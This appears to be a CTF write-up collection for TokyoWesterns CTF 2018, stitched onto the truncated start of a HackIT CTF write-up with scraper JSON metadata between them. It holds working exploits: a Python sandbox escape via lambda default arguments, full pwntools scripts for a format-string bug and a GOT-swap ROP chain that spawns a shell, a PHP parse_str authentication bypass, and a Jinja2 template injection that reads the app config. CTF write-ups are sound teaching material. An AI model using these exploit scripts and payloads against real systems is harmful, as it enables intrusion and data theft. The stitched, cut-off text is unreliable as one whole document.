pwn1.chal.ctf.westerns.tokyo 30001\n    lambda x: x\n    <function <lambda> at 0x7ff90e25ec80>\n\nBut even though the syntax is a bit different, lambdas are still functions, and functions take arguments. And, more importantly, arguments can have default values.\n\n    $ nc pwn1.chal.ctf.westerns.tokyo 30001\n    lambda x = 1: x\n    <function <lambda> at 0x7f8159a2bc80>\n\nAnd the default value can actually be any expression.\n\n    $ nc pwn1.chal.ctf.westerns.tokyo 30001\n    lambda x = 1 + 1: x\n    <function <lambda> at 0x7fa981e0bc80>\n\nThis is interesting since the checker only looks into the `body` of the lambda, not the `args` list. Even if the lambda is never called, its argument default values must be evaluated. Now we can use the magic `__import__` function to get the reference to any module we need. `sys` in particular allows us output:\n\n    $ nc pwn1.chal.ctf.westerns.tokyo 30001\n    lambda x = __import__(\"sys\").stdout.write(\"pwned\"): x\n    pwned<function <lambda> at 0x7fde7f032c80>\n\nAnd `os` to get the flag:\n\n    lambda x = __import__('sys').stdout.write(open('flag').read()): x\n    TWCTF{go_to_next_challenge_running_on_port_30002}\n    <function <lambda> at 0x7f6a2e96bc80>\n\nOn to the second part, which first asks us for a hash of the first flag, then delivers the [source code of the second part](files/sandbox2.py):\n\n    $ nc pwn1.chal.ctf.westerns.tokyo 30002\n    input sha512(flag1) >> 365d5a383aee6a82ad226043bf7feae5eeed6fbe34a9ef9582527b0b4b4c726637449896bd269bb5f3680971036b023a54cab866137da3bfe5a25fd94059b176\n    (...)\n\nWhat is changed?\n\n    $ diff sandbox.py sandbox2.py\n    2a3\n    > import hashlib\n    5c6,14\n    < blacklist = [ast.Call, ast.Attribute]\n    ---\n    > def check_flag1():\n    >     sys.stdout.write('input sha512(flag1) >> ')\n    >     sys.stdout.flush()\n    >     s = sys.stdin.readline().strip()\n    >     flag = open('./flag', 'rb').read().strip()\n    >     if hashlib.sha512(flag).hexdigest() != s:\n    >         exit()\n    >     sys.stdout.write(open(__file__, 'rb').read().decode())\n    >     sys.stdout.flush()\n    55,58c64,67\n    <             'ListComp': ['elt'],\n    <             'SetComp': ['elt'],\n    <             'DictComp': ['key', 'value'],\n    <             'GeneratorExp': ['elt'],\n    ---\n    >             'ListComp': ['elt', 'generators'],\n    >             'SetComp': ['elt', 'generators'],\n    >             'DictComp': ['key', 'value', 'generators'],\n    >             'GeneratorExp': ['elt', 'generators'],\n    70a80\n    >             'comprehension': ['target', 'iter', 'ifs'],\n    80a91\n    >     check_flag1()\n    87c98\n    <     sys.stdout.flush()\n    \\ No newline at end of file\n    ---\n    >     sys.stdout.flush()\n\nIt seem that the `generators` part in various list comprehensions was never checked. So this also works for part 1:\n\n    $ nc pwn1.chal.ctf.westerns.tokyo 30001\n    [ flag for flag in [open(\"flag\").read()] ]\n    ['TWCTF{go_to_next_challenge_running_on_port_30002}\\n']\n\nBut lambdas are still checked the same way, so:\n\n    $ printf \"365d5a383aee6a82ad226043bf7feae5eeed6fbe34a9ef9582527b0b4b4c726637449896bd269bb5f3680971036b023a54cab866137da3bfe5a25fd94059b176\\nlambda x = __import__('sys').stdout.write(open('flag2').read()): x\" | nc pwn1.chal.ctf.westerns.tokyo 30002\n    (...)\n    TWCTF{baby_sandb0x_escape_with_pythons}\n    <function <lambda> at 0x7f47bb263158>\n\nThe correct filenames were found by listing the current directory using the `os` module. This challenge allows RCE of any sort but the user executing the Python script is very limited and the best we can do is list the `home` directories on the same machines, which happened to be the other pwn challenges.\n\n`TWCTF{go_to_next_challenge_running_on_port_30002}`\n\n`TWCTF{baby_sandb0x_escape_with_pythons}`\n\n## 239 Pwnable / Neighbor C ##\n\n**Description**\n\n> Hello Neighbor!\n> \n> nc neighbor.chal.ctf.westerns.tokyo 37565\n\n**Files provided**\n\n - [`neighbor_c`](files/neighbor_c.bin)\n - [`libc.so.6`](files/libc.so.6)\n\n**Solution** (by [Mem2019](https://github.com/Mem2019))\n\nThe program is simple, a format string vuln\n\n```c\nvoid __fastcall __noreturn sub_8D0(FILE *stderr)\n{\n  while ( fgets(format, 256, stdin) )\n  {\n    fprintf(stderr, format);\n    sleep(1u);\n  }\n  exit(1);\n}\n```\n\nHowever, the stderr is not redirected to the socket, so the leak is currently not available\n\nMy approach is to rewrite the `fd` field of `stderr`, it is initially 2, and if we can rewrite it to 1, it will essentially becomes a stdout.\n\nThere are two value in the stack pointing to the `stderr`, `6$` and `8$`, in which `6$` can be editted since it is not used anymore. Firstly we need to rewrite a saved `rbp` value using `rbp` chain to let it point to the pointer to `stderr`, and edit the pointer to let it point to its fd field, then rewrite that to `1`. To be specific, write `%9$hhn` to change `11$` to pointer to pointer to `stderr`, then write `%11$hhn` to let it points to fd, then `%6$hhn` to change the `fd` to `stdout`\n\nHowever, for the saved rbp values, which are pointers of stack, the value of LSB is uncertain unlike other pages, but the last 4 bits are always zero to ensure the alignment. Thus, the probability of success is `1/16`, which is acceptable.\n\n```\nPlease tell me about yourself. I must talk about you to our mayor.\n%9$p\n0x7ffd5d257ca0\nPlease tell me about yourself. I must talk about you to our mayor.\n%9$p\n0x7ffeaa4289e0\nPlease tell me about yourself. I must talk about you to our mayor.\n%9$p\n0x7ffe77564440\n```\n\nWe can disable ALSR to make our debugging more convinient: `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space`\n\nAfter changing the bytes to stdout, we can leak everything. The way to getshell is then not hard, attack `_FILE_IO`, or return address of `fprintf`, whatever u what. What I did is rewrite the return address to `one_gadget`, but before that we need to do some preparation(write `NULL` for requirement of `one_gadget`, write pointers to saved return address of `fprintf` on stack) first.\n\nthe exp:\n\n```python\nfrom pwn import *\n\ng_local=True\ncontext.log_level='debug'\nUNSORTED_OFF = 0x3c4b78\nIO_STR_FINISH = 0x3C37B0\nGUESSED_STDERR_POS = 0x28\nGUESSED_NEEDNULL_POS = (0x58 - 0x28) + GUESSED_STDERR_POS\nGUESSED_FPRINTF_RET_POS = (0x18 - 0x28) + GUESSED_STDERR_POS\nGUESSED_BUF_POS = (0x68 - 0x28) + GUESSED_STDERR_POS\n#14 15 16 for format $\n\nif g_local:\n\te = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\")\n\tsh = process('./neighbor_c')#env={'LD_PRELOAD':'./libc.so.6'}\n\tONE_GADGET_OFF = 0x4526a\n\tgdb.attach(sh)\nelse:\n\tsh = remote(\"neighbor.chal.ctf.westerns.tokyo\", 37565)\n\te = ELF(\"./libc.so.6\")\n\tONE_GADGET_OFF = 0x4557a\n\ndef slp():\n\tif g_local:\n\t\tsleep(0.1)\n\telse:\n\t\tsleep(1.1)\n\ndef hhn(pos, val):\n\tassert val < 0x100\n\tif val == 0:\n\t\treturn \"%\" + str(pos) + \"$hhn\"\n\telse:\n\t\treturn \"%\" + str(val) + \"c%\" + str(pos) + \"$hhn\"\n\ndef hn(pos, val):\n\tassert val < 0x10000\n\tif val == 0:\n\t\treturn \"%\" + str(pos) + \"$hn\"\n\telse:\n\t\treturn \"%\" + str(val) + \"c%\" + str(pos) + \"$hn\"\n\ndef once(payload):\n\tsh.send(payload + \"\\n\")\n\tslp()\n\treturn sh.recv(timeout=0.1)\n\ndef stack_hn(rel_pos, val):\n\tonce(hhn(9, rel_pos))\n\tonce(hn(11, val))\n\ndef write_addr(rel_pos, val):\n\tstack_hn(rel_pos, val & 0xffff)\n\tstack_hn(rel_pos + 2, (val >> 0x10) & 0xffff)\n\tstack_hn(rel_pos + 4, (val >> 0x20) & 0xffff)\n\ndef cont_shoot(poses, vals, extra):\n\tassert len(poses) == len(vals)\n\tsize = len(poses)\n\tret = \"\"\n\ti = 0\n\tcur_size = 0\n\tnext_overflow = 0\n\twhile i < size:\n\t\tassert next_overflow >= cur_size\n\t\tnum = next_overflow - cur_size + vals[i]\n\t\tif num < 0x10000:\n\t\t\tret += hn(poses[i], num)\n\t\t\tnext_overflow += 0x10000\n\t\telse:\n\t\t\tnum = vals[i] - (cur_size - (next_overflow - 0x10000))\n\t\t\tassert num >= 0\n\t\t\tret += hn(poses[i], num)\n\t\tcur_size += num\n\t\ti += 1\n\treturn ret\n\nsh.recvuntil(\"Please tell me about yourself. I must talk about you to our mayor.\\n\")\n\nonce(hhn(9, GUESSED_STDERR_POS))\nonce(hhn(11, (e.symbols[\"_IO_2_1_stderr_\"] & 0xff) + 0x70))\nonce(hhn(6, 1))\n# now stderr is already stdout, u can leak everything\n\nif once(\"test\") != \"test\\n\":\n\tquit(1)\n\nwrite_addr(GUESSED_NEEDNULL_POS, 0)\n#for 0x30 one_gadget\n\nstack_addr = int(once(\"%9$lx\"), 16)\nlibc_addr = int(once(\"%8$lx\"), 16) - e.symbols[\"_IO_2_1_stderr_\"]\nprint hex(libc_addr)\nprint hex(stack_addr)\n\nwrite_addr(GUESSED_BUF_POS, stack_addr - 0x50 + 0x18)\nwrite_addr(GUESSED_BUF_POS + 8, stack_addr - 0x50 + 0x1A)\nwrite_addr(GUESSED_BUF_POS + 0x10, stack_addr - 0x50 + 0x1C)\n#14 15 16 for format $ to rewrite ret addr of fprintf\n\none_gadget = libc_addr + ONE_GADGET_OFF\n\nonce(cont_shoot([14,15,16],[one_gadget & 0xffff, (one_gadget >> 0x10) & 0xffff, one_gadget >> 0x20], \"\"))\n\nsh.interactive()\n```\n\n## 233 Pwnable / swap Returns ##\n\n**Description**\n\n> SWAP SAWP WASP PWAS SWPA\n> \n> nc swap.chal.ctf.westerns.tokyo 37567\n\n**Files provided**\n\n - [`swap_returns`](files/swap_returns)\n - [`libc.so.6`](files/libc.so.6)\n\n**Solution** (by [Mem2019](https://github.com/Mem2019))\n\nThe program is simple, we can swap the `QWORD` given 2 addresses. The first thing that comes in my mind is to swap the `GOT table`, but the only useful part seems to be swap the `atoi` and `printf`, thus we can leak the stack address using `%p`.\n\nThe problem is that we can control almost nothing on the stack, 2 pointers that must be used for swapping, 2 bytes which is not enough to do anything. Here is where I got stucked. Then I inspect the stack and `.data` to find something useful to swap, then I found `0x400700`, which is the entry point, on the stack. Thus, if we swap the `exit` with this entry point, we can rerun the program each time we call `exit`. In this way we can shift the stack up, at the same time the values of that 2 pointers is remained on the stack, which are controllable.\n\nTherefore, we can call set and exit for multiple times, and then call swap to swap those data to construct a ROP chain, then swap `printf` with a gadget that is putted in the stack beforehand, then call `printf` to execute our ROP.\n\nWhat I did is to do it in 2 steps, in the first step I leak the libc address, and return to main function, in the second step I call `system(\"/bin/sh\")` to getshell\n\nInitially I want to call read directly, however, there is no `pop rdx`, so I used this 2-step way.\n\nexp:\n\n```python\nfrom pwn import *\n\ng_local=True\ncontext.log_level='debug'\n\np = ELF(\"./swap_returns\")\nSTART_OFF = -6 + 0x90\nADD_RSP_0x38 = 0x400a46\nPOP_RDI_RET = 0x400a53\nPOP_RSI_R15_RET = 0x400a51\nMAIN = 0x4008E9\n\nif g_local:\n\te = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\")\n\tsh = process('./swap_returns')#env={'LD_PRELOAD':'./libc.so.6'}\n\tONE_GADGET_OFF = 0x4526a\n\tgdb.attach(sh)\nelse:\n\tsh = remote(\"swap.chal.ctf.westerns.tokyo\", 37567)\n\te = ELF(\"./libc.so.6\")\n\tONE_GADGET_OFF = 0x4557a\n\ndef set_pointers(addr1, addr2):\n\tsh.send(\"1\\n\")\n\tsh.recvuntil(\"1st address: \\n\")\n\tsh.send(str(addr1) + \"\\n\")\n\tsh.recvuntil(\"2nd address: \\n\")\n\tsh.send(str(addr2) + \"\\n\")\n\tsh.recvuntil(\"Your choice: \\n\")\n\ndef swap():\n\tsh.send(\"2\\n\")\n\tsh.recvuntil(\"Your choice: \\n\")\n\ndef exit():\n\tsh.send(\"3\\n\")\n\tsh.recvuntil(\"Your choice: \\n\")\n\ndef invalid_choice():\n\tsh.send(\"4\\n\")\n\tsh.recvuntil(\"Your choice: \\n\")\n\n#leak stack addr---------------------------\n\ninvalid_choice()\n#make sure dl resolve being called\n\nset_pointers(p.got[\"atoi\"], p.got[\"printf\"])\nswap()\n\nsh.send(\"%p\")\nstack_leak = sh.recvuntil(\"0x\")\nstack_addr = int(sh.recv(12), 16)\nprint hex(stack_addr)\n\n\n#recover atoi and printf-------------------------\nsh.recvuntil(\"Your choice: \\n\")\nsh.send(\"A\") # strlen = 1, so set pointer\n\nsh.recvuntil(\"1st address: \\n\")\nsh.send(str(p.got[\"atoi\"]) + \"\\n\")\nsh.recvuntil(\"2nd address: \\n\")\nsh.send(str(p.got[\"printf\"]) + \"\\n\")\nsh.recvuntil(\"Your choice: \\n\")\n\nsh.send(\"AA\") # strlen = 2, so swap\nsh.recvuntil(\"Your choice: \\n\")\n\n#replace exit with _start-------------------------\nset_pointers(stack_addr + START_OFF, p.got[\"_exit\"])\nswap()\n#now call exit to raise the stack\n\n\n#fill stack & construct ROP----------------------\ndef fill_stack(data):\n\tassert len(data) == 0x10\n\tset_pointers(u64(data[:8]), u64(data[8:]))\n\texit()\n\nrop = p64(POP_RDI_RET)\nrop += p64(p.got[\"puts\"])\nrop += p64(p.plt[\"puts\"])\nrop += p64(MAIN)\nrop += p64(ADD_RSP_0x38)\nrop += p64(0)\n# rdx is 0, and no pop rdx, so failed\n# rop += p64(POP_RDI_RET)\n# rop += p64(0)\n# rop += p64(POP_RSI_R15_RET)\n# rop += p64(stack_addr - ) #todo\n# rop += p64(ADD_RSP_0x38)\n# rop += p64(p.plt[\"read\"])\n# rop += \"gadget\\x00\\x00\" #to be filled\n\ni = len(rop) - 0x10\nwhile i >= 0:\n\tfill_stack(rop[i:i+0x10])\n\ti -= 0x10\n\n#sh.interactive()\n\nfst_data = stack_addr - 0x1f6\nprint hex(fst_data)\n#0x110 for each, totally len(rop)/0x10\n#-0x53e is the stack when printf being called\n\nprintf_rsp = stack_addr - 0x31e\nrop_dst = printf_rsp + 0x38\nprint hex(rop_dst)\n\nfor i in xrange(0, len(rop)/0x10):\n\tset_pointers(fst_data + 0x110 * i, rop_dst + 0x10 * i)\n\tswap()\n\tset_pointers(fst_data + 0x110 * i + 8, rop_dst + 0x10 * i + 8)\n\tswap()\n\nadd_rsp = rop_dst + 0x20\nset_pointers(add_rsp, p.got[\"printf\"])\nswap()\n\nsh.send(\"3\\n\")\n#rop will call main again, with return address being printf\nleak = sh.recvuntil(\"\\x7f\\n\")\nlibc_addr = u64(leak[:6] + \"\\x00\\x00\") - e.symbols[\"puts\"]\n\nprint hex(libc_addr)\nsh.recvuntil(\"Your choice: \\n\")\n\nset_pointers(add_rsp, p.got[\"printf\"])\nswap()\n#swap printf back\n\nrop2 = p64(POP_RDI_RET)\nrop2 += p64(libc_addr + next(e.search(\"/bin/sh\\x00\")))\nrop2 += p64(libc_addr + e.symbols[\"system\"])\nrop2 += p64(0)\n\ni = len(rop2) - 0x10\nwhile i >= 0:\n\tprint rop2[i:i+0x10]\n\tfill_stack(rop2[i:i+0x10])\n\ti -= 0x10\n\nfst_data = stack_addr - 0x406\nprint hex(fst_data)\n#0x110 for each, totally len(rop)/0x10\n#-0x53e is the stack when printf being called\n\nprintf_rsp = stack_addr - 0x52e\nrop_dst = printf_rsp + 0x38\nprint hex(rop_dst)\n\nfor i in xrange(0, len(rop2)/0x10):\n\tset_pointers(fst_data + 0x118 * i, rop_dst + 0x10 * i)\n\tswap()\n\tset_pointers(fst_data + 0x118 * i + 8, rop_dst + 0x10 * i + 8)\n\tswap()\n\t#interval becomes 0x118, not sure why,\n\t#maybe there is a stack adjustment in _libc_start_main\n\t#the ROP that returns to the main breaks the alignment,\n\t#so that it will adjust alignment and change this distance?\n\nset_pointers(add_rsp, p.got[\"printf\"])\nswap()\n\nsh.interactive()\n```\n\n## 99 Reversing / dec dec dec ##\n\n**No description**\n\n**Files provided**\n\n - [`dec_dec_dec`](files/dec_dec_dec)\n\n**Solution** (by [Mem2019](https://github.com/Mem2019))\n\nThe first encode is base64\n\n```c\n_BYTE *__fastcall base64(const char *a1)\n{\n  unsigned int v1; // ST1C_4\n  int v2; // ST2C_4\n  _BYTE *v3; // rax\n  _BYTE *v4; // ST30_8\n  _BYTE *v5; // rax\n  _BYTE *v6; // rax\n  int v7; // ST24_4\n  _BYTE *v8; // rax\n  _BYTE *v9; // ST30_8\n  _BYTE *v10; // rax\n  _BYTE *v11; // rax\n  unsigned int v12; // ST1C_4\n  _BYTE *v13; // rax\n  _BYTE *v14; // ST30_8\n  _BYTE *v15; // rax\n  _BYTE *v16; // rax\n  signed int i; // [rsp+10h] [rbp-80h]\n  unsigned int v19; // [rsp+14h] [rbp-7Ch]\n  _BYTE *v20; // [rsp+30h] [rbp-60h]\n  _BYTE *v21; // [rsp+38h] [rbp-58h]\n  __int64 v22; // [rsp+40h] [rbp-50h]\n  __int64 v23; // [rsp+48h] [rbp-48h]\n  __int64 v24; // [rsp+50h] [rbp-40h]\n  __int64 v25; // [rsp+58h] [rbp-38h]\n  __int64 v26; // [rsp+60h] [rbp-30h]\n  __int64 v27; // [rsp+68h] [rbp-28h]\n  __int64 v28; // [rsp+70h] [rbp-20h]\n  __int64 v29; // [rsp+78h] [rbp-18h]\n  char v30; // [rsp+80h] [rbp-10h]\n  unsigned __int64 v31; // [rsp+88h] [rbp-8h]\n\n  v31 = __readfsqword(0x28u);\n  v22 = 'HGFEDCBA';\n  v23 = 'PONMLKJI';\n  v24 = 'XWVUTSRQ';\n  v25 = 'fedcbaZY';\n  v26 = 'nmlkjihg';\n  v27 = 'vutsrqpo';\n  v28 = '3210zyxw';\n  v29 = '/+987654';\n  v30 = 0;\n  v19 = strlen(a1);\n  v21 = malloc(4 * v19 / 3 + 1);\n  v20 = v21;\n  for ( i = 0; i < (signed int)(v19 - v19 % 3); i += 3 )\n  {\n    v1 = (a1[i + 1] << 8) + (a1[i] << 16) + a1[i + 2];\n    v2 = a1[i + 2] & 0x3F;\n    v3 = v20;\n    v4 = v20 + 1;\n    *v3 = *((_BYTE *)&v22 + ((v1 >> 18) & 0x3F));\n    v5 = v4++;\n    *v5 = *((_BYTE *)&v22 + ((v1 >> 12) & 0x3F));\n    *v4 = *((_BYTE *)&v22 + ((v1 >> 6) & 0x3F));\n    v6 = v4 + 1;\n    v20 = v4 + 2;\n    *v6 = *((_BYTE *)&v22 + v2);\n  }\n  if ( v19 % 3 == 1 )\n  {\n    v7 = 16 * a1[i] & 0x3F;\n    v8 = v20;\n    v9 = v20 + 1;\n    *v8 = *((_BYTE *)&v22 + (((unsigned int)(a1[i] << 16) >> 18) & 0x3F));\n    v10 = v9++;\n    *v10 = *((_BYTE *)&v22 + v7);\n    *v9 = '=';\n    v11 = v9 + 1;\n    v20 = v9 + 2;\n    *v11 = '=';\n  }\n  else if ( v19 % 3 == 2 )\n  {\n    v12 = (a1[i] << 16) + (a1[i + 1] << 8);\n    v13 = v20;\n    v14 = v20 + 1;\n    *v13 = *((_BYTE *)&v22 + ((v12 >> 18) & 0x3F));\n    v15 = v14++;\n    *v15 = *((_BYTE *)&v22 + ((v12 >> 12) & 0x3F));\n    *v14 = *((_BYTE *)&v22 + ((v12 >> 6) & 0x3F));\n    v16 = v14 + 1;\n    v20 = v14 + 2;\n    *v16 = 61;\n  }\n  *v20 = 0;\n  return v21;\n}\n```\n\nthe second encode is some rotate\n\n```c\nchar *__fastcall rot(char *a1)\n{\n  int v1; // ST1C_4\n  char *s; // [rsp+8h] [rbp-28h]\n  char v4; // [rsp+1Bh] [rbp-15h]\n  char *v5; // [rsp+20h] [rbp-10h]\n  char *v6; // [rsp+28h] [rbp-8h]\n\n  s = a1;\n  v1 = strlen(a1);\n  v6 = (char *)malloc((unsigned int)(v1 + 1));\n  v5 = v6;\n  while ( *s )\n  {\n    v4 = *s;\n    if ( *s > 0x40 && v4 <= 'Z' )\n    {\n      *v5 = (v4 - '4') % 26 + 'A';\n    }\n    else if ( v4 > '`' && v4 <= 'z' )\n    {\n      *v5 = (v4 - 'T') % 26 + 'a';\n    }\n    else\n    {\n      *v5 = *s;\n    }\n    ++v5;\n    ++s;\n  }\n  *v5 = 0;\n  return v6;\n}\n```\n\nThe third encode, well, I don't know what's that. According to my test, the first byte is a checksum, and each 4 bytes from the remaining bytes correspond to 3 bytes from input, so we can brute force crack it.\n\n```c\nchar* res = \"@25-Q44E233=,>E-M34=,,$LS5VEQ45)M2S-),7-$/3T \";\nunsigned char buf[128];\nint main(int argc, char *argv[])\n{\n\tunsigned int* ures = (unsigned int*)(res + 1);\n\tfor (int i = 0; i < 11; ++i)\n\t{\n\t\t//printf(\"%d: \\n\", i);\n\t\tfor (int c = 0; c < 0x1000000; ++c)\n\t\t{\n\t\t\tchar* tmp1 = rot((char*)&c);\n\t\t\tunsigned char* tmp2 = (unsigned char*)trans((unsigned char*)tmp1);\n\t\t\t//puts(tmp2);\n\t\t\t//puts(ures + i);\n\t\t\tif (*(unsigned int*)(tmp2 + 1) == ures[i])\n\t\t\t{\n\t\t\t\t//printf(\"%d found\", i);\n\t\t\t\tprintf(\"%s\", (char*)&c);\n\t\t\t}\n\t\t\tfree(tmp1);\n\t\t\tfree(tmp2);\n\t\t}\n\t}\n\treturn 0;\n}\n```\n\n## 28 Warmup / Welcome!! ##\n\n**Description**\n\n> Welcome\n> \n> `TWCTF{Welcome_TokyoWesterns_CTF_2018!!}`\n\n**No files provided**\n\n**Solution**\n\n...\n\n`TWCTF{Welcome_TokyoWesterns_CTF_2018!!}`\n\n## 55 Web / SimpleAuth ##\n\n**Description**\n\n> http://simpleauth.chal.ctf.westerns.tokyo/\n\n**No files provided**\n\n**Solution**\n\nOn the website we are shown the source code:\n\n```php\n<?php\n\nrequire_once 'flag.php';\n\nif (!empty($_SERVER['QUERY_STRING'])) {\n    $query = $_SERVER['QUERY_STRING'];\n    $res = parse_str($query);\n    if (!empty($res['action'])){\n        $action = $res['action'];\n    }\n}\n\nif ($action === 'auth') {\n    if (!empty($res['user'])) {\n        $user = $res['user'];\n    }\n    if (!empty($res['pass'])) {\n        $pass = $res['pass'];\n    }\n\n    if (!empty($user) && !empty($pass)) {\n        $hashed_password = hash('md5', $user.$pass);\n    }\n    if (!empty($hashed_password) && $hashed_password === 'c019f6e5cd8aa0bbbcc6e994a54c757e') {\n        echo $flag;\n    }\n    else {\n        echo 'fail :(';\n    }\n}\nelse {\n    highlight_file(__FILE__);\n}\n?>\n```\n\nThe hash is not known on crackstation, so there must be another issue with the code. I created a local copy of the script to play around with it and I noticed some weird behaviour – no matter what `$query` I provided, `$res` always seemed to be `null`.\n\nLooking at [the manual entry for parse_str](http://php.net/manual/en/function.parse-str.php) this weirdness is explained almost immediately with a big red warning sign. If the function is used with a single argument, as is the case in this challenge, it sets (and overrides) variables in the current scope. It never returns anything, so `$res` is always `null`.\n\nSo we can simply go to:\n\n    http://simpleauth.chal.ctf.westerns.tokyo/?action=auth&hashed_password=c019f6e5cd8aa0bbbcc6e994a54c757e\n\nAnd get the flag.\n\n`TWCTF{d0_n0t_use_parse_str_without_result_param}`\n\n## 190 Web / shrine ##\n\n**Description**\n\n> [shrine](http://shrine.chal.ctf.westerns.tokyo/) is translated as jinja in Japanese.\n\n**No files provided**\n\n**Solution**\n\nThe website shows us its source code:\n\n```python\n\nimport flask\nimport os\n\n\napp = flask.Flask(__name__)\napp.config['FLAG'] = os.environ.pop('FLAG')\n\n@app.route('/')\ndef index():\n    return open(__file__).read()\n\n@app.route('/shrine/<path:shrine>')\ndef shrine(shrine):\n    def safe_jinja(s):\n        s = s.replace('(', '').replace(')', '')\n        blacklist = ['config', 'self']\n        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist])+s\n    return flask.render_template_string(safe_jinja(shrine))\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```\n\nSo it is an application using [Flask](http://flask.pocoo.org/), which also includes the templating engine [Jinja2](http://jinja.pocoo.org/).\n\nIt lets us provide an arbitrary string that is then evaluated as a template string. However, some code is prepended, which has the effect of hiding the proper values of `config` and `self`, variables which would normally be globally available in templates for convenience.\n\nThese two variables are not the only ones that are always made available in template contexts, however. [This page](http://flask.pocoo.org/docs/1.0/templating/#standard-context) has the full list:\n\n - `config` (unavailable)\n - `request`\n - `session`\n - `g`\n - `url_for()`\n - `get_flashed_messages()`\n\nI tried to get something useful from `request`, `session`, or `g` for a while, but I couldn't find a single reference to the Flask application object. But I guess I was on the wrong path, since the `url_for()` function is much more useful:\n\n    input:  {{url_for}}\n    URL:    http://shrine.chal.ctf.westerns.tokyo/shrine/%7B%7Burl_for%7D%7D\n    output: <function url_for at 0x7f3429e20d08>\n\nA reference to a function is useful because it has some magic variables that refer to its global and local context (important for closures and the like):\n\n    input:  {{url_for.__globals__}}\n    URL:    http://shrine.chal.ctf.westerns.tokyo/shrine/%7B%7Burl_for.__globals__%7D%7D\n    output: (... a full list of globals, including current_app)\n    \n    input:  {{url_for.__globals__.current_app}}\n    URL:    http://shrine.chal.ctf.westerns.tokyo/shrine/%7B%7Burl_for.__globals__.current_app%7D%7D\n    output: <Flask 'app'>\n    \n    input:  {{url_for.__globals__.current_app.config}}\n    URL:    http://shrine.chal.ctf.westerns.tokyo/shrine/%7B%7Burl_for.__globals__.current_app.config%7D%7D\n    output: (... the full configuration)\n    \n    input:  {{url_for.__globals__.current_app.config.FLAG}}\n    URL:    http://shrine.chal.ctf.westerns.tokyo/shrine/%7B%7Burl_for.__globals__.current_app.config.FLAG%7D%7D\n    output: TWCTF{pray_f0r_sacred_jinja2}\n\n`TWCTF{pray_f0r_sacred_jinja2}`\n", "timestamp": "2025-10-24T11:39:05.947192"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2018-09-08-HackIT-CTF/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2018-09-08-HackIT-CTF/README.md", "content": "# 2018-09-08-HackIT-CTF #\n\n[CTFTime link](https://ctftime.org/event/672) | [Website](https://ctf.hackit.ua/)\n\n---\n\n## Challenges ##\n\n### Reverse ###\n\n - [x] [876 baby_first](#876-reverse--baby_first)\n - [ ] 997 Crynary\n - [ ] 1000 coffee_overflow\n\n### Misc ###\n\n - [ ] 976 PyCry\n - [ ] 987 Paranoid Kitty\n - [x] [997 Magician's spells](#997-misc--magicians-spells)\n - [ ] 999 Inves2gate\n - [ ] 999 Trap-o-saur\n - [ ] 1000 Bulwarck\n - [ ] 1000 Smartpher\n - [ ] 1000 kittenware\n\n### Web ###\n\n - [x] [42 BabyPeeHPee](#42-web--babypeehpee)\n - [ ] 447 Believer Case\n - [ ] 847 Republic of Gayming\n - [ ] 862 Into Darkness\n - [ ] 987 PeeHPee2\n - [ ] 1000 RuAdmin\n - [ ] 1000 Blockchain Startup\n\n### Pwn ###\n\n - [x] [741 Army](#741-pwn--army)\n - [x] [954 A Heap Interface](#954-pwn--a-heap-interface)\n - [x] [982 Bank Reimplemented](#982-pwn--bank-reimplemented)\n - [x] [982 KAMIKAZE](#982-pwn--kamikaze)\n - [x] 997 HashMan\n\n### Welcome ###\n\n - [x] [1 Get Going](#1-welcome--get-going)\n\n---\n\n## 876 Reverse / baby_first ##\n\n**Description**\n\n> Wooble CEO's baby is learning computers. Help him with math.\n\n**Files provided**\n\n - [re1](files/re1)\n\n**Solution** (by [Mem2019](https://github.com/Mem2019))\n\nuse IDA to open it, and the program is 64 bit ARM. There are many functions, so let's look at string first.\n\nThen we can find the string `\"oh noes! you no haz flag!\"`, xref it, the function seems to be the verification function.\n\nBy inspecting the code, we can find that this is a matrix multiplication using nested loop to access data and compare the result with given data, we can take the matrix by the following C code. (modified from decompiled code)\n\n`DATA2_NUM` from IDA analysis is incorrect, so I obtained it manually\n\n```c\n#include <stdio.h>\n#include <stdint.h>\n#define DATA1_OFF 0x7d010\n#define DATA2_OFF 0x110a90\n#define DATA1_NUM 151200\n#define DATA2_NUM 7564\nuint32_t data1[DATA1_NUM];\nuint32_t data2[DATA2_NUM];\nvoid load1()\n{\n  FILE* f = fopen(\"./re1\", \"rb\");\n  fseek(f, DATA1_OFF, SEEK_SET);\n  fread(data1, sizeof(uint32_t), DATA1_NUM, f);\n  fclose(f);\n}\n\nvoid load2()\n{\n  FILE* f = fopen(\"./re1\", \"rb\");\n  fseek(f, DATA2_OFF, SEEK_SET);\n  fread(data2, sizeof(uint32_t), DATA2_NUM, f);\n  fclose(f);\n}\n\nvoid show_matrix()\n{\n  signed int i;\n  signed int j;\n  signed int k;\n  signed int l;\n  signed int m;\n  signed int n;\n  signed int ii;\n\n  for ( i = 0; i <= 6; ++i )\n  {\n    for ( j = 0; j <= 8; ++j )\n    {\n      for ( k = 0; k <= 2; ++k )\n      {\n        for ( l = 0; l <= 4; ++l )\n        {\n          for ( m = 0; m <= 1; ++m )\n          {\n            for ( n = 0; n <= 3; ++n )\n            {\n              printf(\"[\");\n              for ( ii = 0; ii <= 19; ++ii )\n              {\n                int idx = 0x50LL * m + 0x5460LL * i + \n                          0x960LL * j + 0x14LL * n + 0xA0LL * l + \n                          0x320LL * k + ii;\n                if (idx >= DATA1_NUM)\n                {\n                  printf(\"out of bound\\n\");\n                }\n                printf(\"%u, \", data1[idx]);\n              }\n              printf(\"],\");\n              int idx = 4 * (2 * (15LL * j + \n                                  135LL * i + 5LL * k + l) + m) + n;\n              if (idx >= DATA2_NUM)\n              {\n                printf(\"out of bound\\n\");\n              }\n              printf(\" %u\\n\", data2[idx]);\n            }\n          }\n        }\n      }\n    }\n  }\n}\nint main()\n{\n  load1();\n  load2();\n  show_matrix();\n  return 0;\n}\n```\n\nHowever, the result is huge with around 7560 lines, but for linear equation solving with 20 dimension vector, we only need a 20x20 matrix, so just take the first 20 data\n\n```python\nfrom numpy import *\nmat = [[62, 23, 49, 47, 63, 36, 91, 6, 31, 16, 11, 91, 2, 49, 73, 19, 77, 76, 67, 86],\n[89, 37, 34, 76, 30, 14, 73, 32, 20, 84, 85, 67, 3, 62, 54, 20, 